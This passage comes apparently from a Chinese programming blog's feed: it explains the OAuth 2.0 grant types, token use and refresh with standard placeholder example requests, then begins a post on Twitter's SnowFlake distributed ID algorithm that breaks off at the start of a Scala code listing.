<p>&emsp;&emsp;从上面代码可以看到，相关参数使用 JSON 格式发送（Content-Type: application/json）。此外，HTTP 头信息中明确指定不得缓存。</p>
<h3 id="简化模式"><a href="#简化模式" class="headerlink" title="简化模式"></a>简化模式</h3><p>&emsp;&emsp;简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了”授权码”这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。</p>
<figure class="image-box">
                <img src="bg2014051205.png" alt title class>
                <p></p>
            </figure>

<p>它的步骤如下：</p>
<blockquote>
<p>（A）客户端将用户导向认证服务器。<br>（B）用户决定是否给于客户端授权。<br>（C）假设用户给予授权，认证服务器将用户导向客户端指定的”重定向 URI”，并在 URI 的 Hash 部分包含了访问令牌。<br>（D）浏览器向资源服务器发出请求，其中不包括上一步收到的 Hash 值。<br>（E）资源服务器返回一个网页，其中包含的代码可以获取 Hash 值中的令牌。<br>（F）浏览器执行上一步获得的脚本，提取出令牌。<br>（G）浏览器将令牌发给客户端。</p>
</blockquote>
<p>下面是上面这些步骤所需要的参数。  </p>
<p>A 步骤中，客户端发出的 HTTP 请求，包含以下参数：</p>
<ul>
<li>response_type：表示授权类型，此处的值固定为 “token”，必选项。</li>
<li>client_id：表示客户端的 ID，必选项。</li>
<li>redirect_uri：表示重定向的 URI，可选项。</li>
<li>scope：表示权限范围，可选项。</li>
<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz</span><br><span class="line">    &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br></pre></td></tr></table></figure>

<p>C 步骤中，认证服务器回应客户端的 URI，包含以下参数：</p>
<ul>
<li>access_token：表示访问令牌，必选项。</li>
<li>token_type：表示令牌类型，该值大小写不敏感，必选项。</li>
<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>
<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>
<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA</span><br><span class="line">          &amp;state=xyz&amp;token_type=example&amp;expires_in=3600</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在上面的例子中，认证服务器用 HTTP 头信息的 Location 栏，指定浏览器重定向的网址。注意，在这个网址的 Hash 部分包含了令牌。<br>&emsp;&emsp;根据上面的 D 步骤，下一步浏览器会访问 Location 指定的网址，但是 Hash 部分不会发送。接下来的 E 步骤，服务提供商的资源服务器发送过来的代码，会提取出 Hash 中的令牌。</p>
<h3 id="密码模式"><a href="#密码模式" class="headerlink" title="密码模式"></a>密码模式</h3><p>&emsp;&emsp;密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向”服务商提供商”索要授权。<br>&emsp;&emsp;在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。</p>
<figure class="image-box">
                <img src="bg2014051206.png" alt title class>
                <p></p>
            </figure>

<p>它的步骤如下：</p>
<blockquote>
<p>（A）用户向客户端提供用户名和密码。<br>（B）客户端将用户名和密码发给认证服务器，向后者请求令牌。<br>（C）认证服务器确认无误后，向客户端提供访问令牌。</p>
</blockquote>
<p>B 步骤中，客户端发出的 HTTP 请求，包含以下参数：</p>
<ul>
<li>grant_type：表示授权类型，此处的值固定为 “password”，必选项。</li>
<li>username：表示用户名，必选项。</li>
<li>password：表示用户的密码，必选项。</li>
<li>scope：表示权限范围，可选项。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /token HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">grant_type=password&amp;username=johndoe&amp;password=A3ddj3w</span><br></pre></td></tr></table></figure>

<p>C 步骤中，认证服务器向客户端发送访问令牌，下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Cache-Control: no-store</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;,</span><br><span class="line">  &quot;token_type&quot;:&quot;example&quot;,</span><br><span class="line">  &quot;expires_in&quot;:3600,</span><br><span class="line">  &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;,</span><br><span class="line">  &quot;example_parameter&quot;:&quot;example_value&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，各个参数的含义参见《授权码模式》一节。<br>整个过程中，客户端不得保存用户的密码。</p>
<h3 id="客户端模式"><a href="#客户端模式" class="headerlink" title="客户端模式"></a>客户端模式</h3><p>&emsp;&emsp;客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向”服务提供商”进行认证。严格地说，客户端模式并不属于 OAuth 框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求”服务提供商”提供服务，其实不存在授权问题。</p>
<figure class="image-box">
                <img src="bg2014051207.png" alt title class>
                <p></p>
            </figure>

<p>它的步骤如下：</p>
<blockquote>
<p>（A）客户端向认证服务器进行身份认证，并要求一个访问令牌。<br>（B）认证服务器确认无误后，向客户端提供访问令牌。</p>
</blockquote>
<p>A 步骤中，客户端发出的 HTTP 请求，包含以下参数：</p>
<ul>
<li>granttype：表示授权类型，此处的值固定为 “clientcredentials”，必选项。</li>
<li>scope：表示权限范围，可选项。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /token HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">grant_type=client_credentials</span><br></pre></td></tr></table></figure>

<p>认证服务器必须以某种方式，验证客户端身份。  </p>
<p>B 步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Cache-Control: no-store</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;,</span><br><span class="line">  &quot;token_type&quot;:&quot;example&quot;,</span><br><span class="line">  &quot;expires_in&quot;:3600,</span><br><span class="line">  &quot;example_parameter&quot;:&quot;example_value&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，各个参数的含义参见《授权码模式》一节。</p>
<h2 id="更新令牌"><a href="#更新令牌" class="headerlink" title="更新令牌"></a>更新令牌</h2><p>&emsp;&emsp;如果用户访问的时候，客户端的”访问令牌”已经过期，则需要使用”更新令牌”申请一个新的访问令牌。  </p>
<p>客户端发出更新令牌的 HTTP 请求，包含以下参数：</p>
<ul>
<li>granttype：表示使用的授权模式，此处的值固定为 “refreshtoken”，必选项。</li>
<li>refresh_token：表示早前收到的更新令牌，必选项。</li>
<li>scope：表示申请的授权范围，不可以超出上一次申请的范围，如果省略该参数，则表示与上一次一致。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /token HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="新"><a href="#新" class="headerlink" title="新"></a>新</h1><p>&emsp;&emsp;<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0</a> 是目前最流行的授权机制，用来授权第三方应用，获取用户数据。  </p>
<p>&emsp;&emsp;<strong>简单说，OAuth 就是一种授权机制。数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌（token），用来代替密码，供第三方应用使用。</strong></p>
<h2 id="令牌与密码"><a href="#令牌与密码" class="headerlink" title="令牌与密码"></a>令牌与密码</h2><p>&emsp;&emsp;令牌（token）与密码（password）的作用是一样的，都可以进入系统，但是有三点差异：</p>
<ol>
<li>令牌是短期的，到期会自动失效，用户自己无法修改。密码一般长期有效，用户不修改，就不会发生变化。</li>
<li>令牌可以被数据所有者撤销，会立即失效。密码一般不允许被他人撤销。</li>
<li>令牌有权限范围（scope）。对于网络服务来说，只读令牌就比读写令牌更安全。密码一般是完整权限。</li>
</ol>
<p>&emsp;&emsp;上面这些设计，保证了令牌既可以让第三方应用获得权限，同时又随时可控，不会危及系统安全。这就是 OAuth 2.0 的优点。  </p>
<p>&emsp;&emsp;注意，只要知道了令牌，就能进入系统。系统一般不会再次确认身份，所以<strong>令牌必须保密，泄漏令牌与泄漏密码的后果是一样的。</strong>这也是为什么令牌的有效期，一般都设置得很短的原因。</p>
<h2 id="RFC-6749"><a href="#RFC-6749" class="headerlink" title="RFC 6749"></a>RFC 6749</h2><p>&emsp;&emsp;OAuth 2.0 的标准是 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">RFC 6749</a> 文件。该文件先解释了 OAuth 是什么。</p>
<blockquote>
<p>&emsp;&emsp;OAuth 引入了一个授权层，用来分离两种不同的角色：客户端和资源所有者。……资源所有者同意以后，资源服务器可以向客户端颁发令牌。客户端通过令牌，去请求数据。</p>
</blockquote>
<p>&emsp;&emsp;这段话的意思就是，<strong>OAuth 的核心就是向第三方应用颁发令牌</strong>。然后，RFC 6749 接着写道：</p>
<blockquote>
<p>&emsp;&emsp;（由于互联网有多种场景，）本标准定义了获得令牌的四种授权方式（authorization grant ）。</p>
</blockquote>
<p>&emsp;&emsp;也就是说，<strong>OAuth 2.0 规定了四种获得令牌的流程。你可以选择最适合自己的那一种，向第三方应用颁发令牌。</strong>下面就是这四种授权方式：</p>
<blockquote>
<ul>
<li>授权码（authorization-code）</li>
<li>隐藏式（implicit）</li>
<li>密码式（password）</li>
<li>客户端凭证（client credentials）</li>
</ul>
</blockquote>
<p>&emsp;&emsp;注意，不管哪一种授权方式，第三方应用申请令牌之前，都必须先到系统备案，说明自己的身份，然后会拿到两个身份识别码：客户端 ID（client ID）和客户端密钥（client secret）。这是为了防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的。</p>
<h2 id="第一种授权方式：授权码"><a href="#第一种授权方式：授权码" class="headerlink" title="第一种授权方式：授权码"></a>第一种授权方式：授权码</h2><p>&emsp;&emsp;<strong>授权码（authorization code）方式，指的是第三方应用先申请一个授权码，然后再用该码获取令牌。</strong><br>&emsp;&emsp;这种方式是最常用的流程，安全性也最高，它适用于那些有后端的 Web 应用。授权码通过前端传送，令牌则是储存在后端，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。  </p>
<p>&emsp;&emsp;第一步，A 网站提供一个链接，用户点击后就会跳转到 B 网站，授权用户数据给 A 网站使用。下面就是 A 网站跳转 B 网站的一个示意链接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/oauth/authorize?</span><br><span class="line">  response_type=code&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  redirect_uri=CALLBACK_URL&amp;</span><br><span class="line">  scope=read</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>response_type</code>参数表示要求返回授权码（<code>code</code>），<code>client_id</code>参数让 B 知道是谁在请求，<code>redirect_uri</code>参数是 B 接受或拒绝请求后的跳转网址，<code>scope</code>参数表示要求的授权范围（这里是只读）。</p>
<figure class="image-box">
                <img src="bg2019040902.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;第二步，用户跳转后，B 网站会要求用户登录，然后询问是否同意给予 A 网站授权。用户表示同意，这时 B 网站就会跳回<code>redirect_uri</code>参数指定的网址。跳转时，会传回一个授权码，就像下面这样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a.com/callback?code=AUTHORIZATION_CODE</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>code</code>参数就是授权码。</p>
<figure class="image-box">
                <img src="bg2019040907.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;第三步，A 网站拿到授权码以后，就可以在后端，向 B 网站请求令牌。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/oauth/token?</span><br><span class="line"> client_id=CLIENT_ID&amp;</span><br><span class="line"> client_secret=CLIENT_SECRET&amp;</span><br><span class="line"> grant_type=authorization_code&amp;</span><br><span class="line"> code=AUTHORIZATION_CODE&amp;</span><br><span class="line"> redirect_uri=CALLBACK_URL</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>client_id</code>参数和<code>client_secret</code>参数用来让 B 确认 A 的身份（<code>client_secret</code>参数是保密的，因此只能在后端发请求），<code>grant_type</code>参数的值是<code>AUTHORIZATION_CODE</code>，表示采用的授权方式是授权码，<code>code</code>参数是上一步拿到的授权码，<code>redirect_uri</code>参数是令牌颁发后的回调网址。</p>
<figure class="image-box">
                <img src="bg2019040904.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;第四步，B 网站收到请求以后，就会颁发令牌。具体做法是向<code>redirect_uri</code>指定的网址，发送一段 JSON 数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,</span><br><span class="line">  &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">  &quot;expires_in&quot;:2592000,</span><br><span class="line">  &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;,</span><br><span class="line">  &quot;scope&quot;:&quot;read&quot;,</span><br><span class="line">  &quot;uid&quot;:100101,</span><br><span class="line">  &quot;info&quot;:&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 JSON 数据中，<code>access_token</code>字段就是令牌，A 网站在后端拿到了。</p>
<figure class="image-box">
                <img src="bg2019040905.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="第二种方式：隐藏式"><a href="#第二种方式：隐藏式" class="headerlink" title="第二种方式：隐藏式"></a>第二种方式：隐藏式</h2><p>&emsp;&emsp;有些 Web 应用是纯前端应用，没有后端。这时就不能用上面的方式了，必须将令牌储存在前端。<strong>RFC 6749 就规定了第二种方式，允许直接向前端颁发令牌。这种方式没有授权码这个中间步骤，所以称为（授权码）”隐藏式”（implicit）。</strong>  </p>
<p>&emsp;&emsp;第一步，A 网站提供一个链接，要求用户跳转到 B 网站，授权用户数据给 A 网站使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/oauth/authorize?</span><br><span class="line">  response_type=token&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  redirect_uri=CALLBACK_URL&amp;</span><br><span class="line">  scope=read</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>response_type</code>参数为<code>token</code>，表示要求直接返回令牌。  </p>
<p>&emsp;&emsp;第二步，用户跳转到 B 网站，登录后同意给予 A 网站授权。这时，B 网站就会跳回<code>redirect_uri</code>参数指定的跳转网址，并且把令牌作为 URL 参数，传给 A 网站。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a.com/callback#token=ACCESS_TOKEN</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>token</code>参数就是令牌，A 网站因此直接在前端拿到令牌。  </p>
<p>&emsp;&emsp;注意，令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在”中间人攻击”的风险，而浏览器跳转时，锚点不会发到服务器，就减少了泄漏令牌的风险。</p>
<figure class="image-box">
                <img src="bg2019040906.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。</p>
<h2 id="第三种方式：密码式"><a href="#第三种方式：密码式" class="headerlink" title="第三种方式：密码式"></a>第三种方式：密码式</h2><p>&emsp;&emsp;<strong>如果你高度信任某个应用，RFC 6749 也允许用户把用户名和密码，直接告诉该应用。该应用就使用你的密码，申请令牌，这种方式称为”密码式”（password）。</strong>  </p>
<p>&emsp;&emsp;第一步，A 网站要求用户提供 B 网站的用户名和密码。拿到以后，A 就直接向 B 请求令牌。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://oauth.b.com/token?</span><br><span class="line">  grant_type=password&amp;</span><br><span class="line">  username=USERNAME&amp;</span><br><span class="line">  password=PASSWORD&amp;</span><br><span class="line">  client_id=CLIENT_ID</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>grant_type</code>参数是授权方式，这里的<code>password</code>表示”密码式”，<code>username</code>和<code>password</code>是 B 的用户名和密码。  </p>
<p>&emsp;&emsp;第二步，B 网站验证身份通过后，直接给出令牌。注意，这时不需要跳转，而是把令牌放在 JSON 数据里面，作为 HTTP 回应，A 因此拿到令牌。  </p>
<p>&emsp;&emsp;这种方式需要用户给出自己的用户名/密码，显然风险很大，因此只适用于其他授权方式都无法采用的情况，而且必须是用户高度信任的应用。</p>
<h2 id="第四种方式：凭证式"><a href="#第四种方式：凭证式" class="headerlink" title="第四种方式：凭证式"></a>第四种方式：凭证式</h2><p>&emsp;&emsp;<strong>最后一种方式是凭证式（client credentials），适用于没有前端的命令行应用，即在命令行下请求令牌。</strong>  </p>
<p>&emsp;&emsp;第一步，A 应用在命令行向 B 发出请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://oauth.b.com/token?</span><br><span class="line">  grant_type=client_credentials&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  client_secret=CLIENT_SECRET</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>grant_type</code>参数等于<code>client_credentials</code>表示采用凭证式，<code>client_id</code>和<code>client_secret</code>用来让 B 确认 A 的身份。  </p>
<p>&emsp;&emsp;第二步，B 网站验证通过以后，直接返回令牌。  </p>
<p>&emsp;&emsp;这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。</p>
<h2 id="令牌的使用"><a href="#令牌的使用" class="headerlink" title="令牌的使用"></a>令牌的使用</h2><p>&emsp;&emsp;A 网站拿到令牌以后，就可以向 B 网站的 API 请求数据了。<br>&emsp;&emsp;此时，每个发到 API 的请求，都必须带有令牌。具体做法是在请求的头信息，加上一个<code>Authorization</code>字段，令牌就放在这个字段里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Authorization: Bearer ACCESS_TOKEN&quot; \</span><br><span class="line">&quot;https://api.b.com&quot;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面命令中，<code>ACCESS_TOKEN</code>就是拿到的令牌。</p>
<h2 id="更新令牌-1"><a href="#更新令牌-1" class="headerlink" title="更新令牌"></a>更新令牌</h2><p>&emsp;&emsp;令牌的有效期到了，如果让用户重新走一遍上面的流程，再申请一个新的令牌，很可能体验不好，而且也没有必要。OAuth 2.0 允许用户自动更新令牌。  </p>
<p>&emsp;&emsp;具体方法是，B 网站颁发令牌的时候，一次性颁发两个令牌，一个用于获取数据，另一个用于获取新的令牌（refresh token 字段）。令牌到期前，用户使用 refresh token 发一个请求，去更新令牌。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/oauth/token?</span><br><span class="line">  grant_type=refresh_token&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  client_secret=CLIENT_SECRET&amp;</span><br><span class="line">  refresh_token=REFRESH_TOKEN</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面 URL 中，<code>grant_type</code>参数为<code>refresh_token</code>表示要求更新令牌，<code>client_id</code>参数和<code>client_secret</code>参数用于确认身份，<code>refresh_token</code>参数就是用于更新令牌的令牌。  </p>
<p>&emsp;&emsp;B 网站验证通过以后，就会颁发新的令牌。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IdentityServer4 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[理解分布式 ID 生成算法 SnowFlake]]></title>
      <url>/2019/12/28/UnderstandSnowFlake/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://segmentfault.com/a/1190000011282426" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011282426</a>  </p>
</blockquote>
<blockquote>
<p>扩展阅读：  </p>
<p>如何在高并发分布式系统中生成全局唯一 Id：<a href="https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html" target="_blank" rel="noopener">https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html</a><br>高并发分布式系统中生成全局唯一 Id 汇总：<a href="https://www.cnblogs.com/baiwa/p/5318432.html" target="_blank" rel="noopener">https://www.cnblogs.com/baiwa/p/5318432.html</a>  </p>
<p>关于全局 ID，雪花（snowflake）算法的说明：<a href="https://www.cnblogs.com/dunitian/p/6130543.html" target="_blank" rel="noopener">https://www.cnblogs.com/dunitian/p/6130543.html</a><br>雪花 ID C# 实现：<a href="https://github.com/stulzq/snowflake-net" target="_blank" rel="noopener">https://github.com/stulzq/snowflake-net</a>  </p>
<p>使用有序 GUID：提升其在各数据库中作为主键时的性能：<a href="https://www.cnblogs.com/CameronWu/p/guids-as-fast-primary-keys-under-multiple-database.html" target="_blank" rel="noopener">https://www.cnblogs.com/CameronWu/p/guids-as-fast-primary-keys-under-multiple-database.html</a>  </p>
</blockquote>
<a id="more"></a>

<p>分布式 id 生成算法的有很多种，Twitter 的 SnowFlake 就是其中经典的一种。</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>SnowFlake 算法生成 id 的结果是一个 64 bit 大小的整数，它的结构如下图：</p>
<figure class="image-box">
                <img src="350263808-59c2254083397_articlex.jpg" alt title class>
                <p></p>
            </figure>

<ul>
<li><code>1位</code>，不用。<ul>
<li>二进制中最高位为 1 的都是负数，但是我们生成的 id 一般都使用整数，所以这个最高位固定是 0</li>
</ul>
</li>
<li><code>41位</code>，用来记录时间戳（毫秒）。<ul>
<li>41 位可以表示 $2^{41}-1$ 个数字</li>
<li>如果只用来表示正整数（计算机中正数包含0），可以表示的数值范围是：0 至 $2^{41}-1$，减 1 是因为可表示的数值范围是从 0 开始算的，而不是 1</li>
<li>也就是说 41 位可以表示 $2^{41}-1$ 个毫秒的值，转化成单位年则是 $(2^{41}-1)/(1000\times60\times60\times24\times365)=69$ 年</li>
</ul>
</li>
<li><code>10 位</code>，用来记录工作机器 id。<ul>
<li>可以部署在 $2^{10}=1024$ 个节点，包括<code>5 位 datacenterId</code>和<code>5 位 workerId</code></li>
<li><code>5 位(bit)</code>可以表示的最大正整数是 $2^5-1=31$ ，即可以用 0, 1, 2, 3, $\cdots$, 31 这 32 个数字，来表示不同的 datecenterId 或 workerId</li>
</ul>
</li>
<li><code>12 位</code>，序列号，用来记录同毫秒内产生的不同 id。<ul>
<li><code>12 位(bit)</code>可以表示的最大正整数是 $2^{12}-1=4095$ ，即可以用 0, 1, 2, 3, $\cdots$, 4094 这 4095 个数字，来表示同一机器同一时间截（毫秒）内产生的 4095 个 ID 序号</li>
</ul>
</li>
</ul>
<p>由于在 Java 中 64 bit 的整数是 long 类型，所以在 Java 中 SnowFlake 算法生成的 id 就是 long 来存储的。  </p>
<p>SnowFlake 可以保证：</p>
<ul>
<li>所有生成的 id 按时间趋势递增</li>
<li>整个分布式系统内不会产生重复 id（因为有 datacenterId 和 workerId 来做区分）</li>
</ul>
<h1 id="Talk-is-cheap-show-you-the-code"><a href="#Talk-is-cheap-show-you-the-code" class="headerlink" title="Talk is cheap, show you the code"></a>Talk is cheap, show you the code</h1><p><strong>以下是 <a href="https://github.com/twitter/snowflake/blob/snowflake-2010/src/main/scala/com/twitter/service/snowflake/IdWorker.scala" target="_blank" rel="noopener">Twitter 官方原版</a> 的，用 Scala 写的</strong>（我也不懂 Scala，当成 Java 看即可）：</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 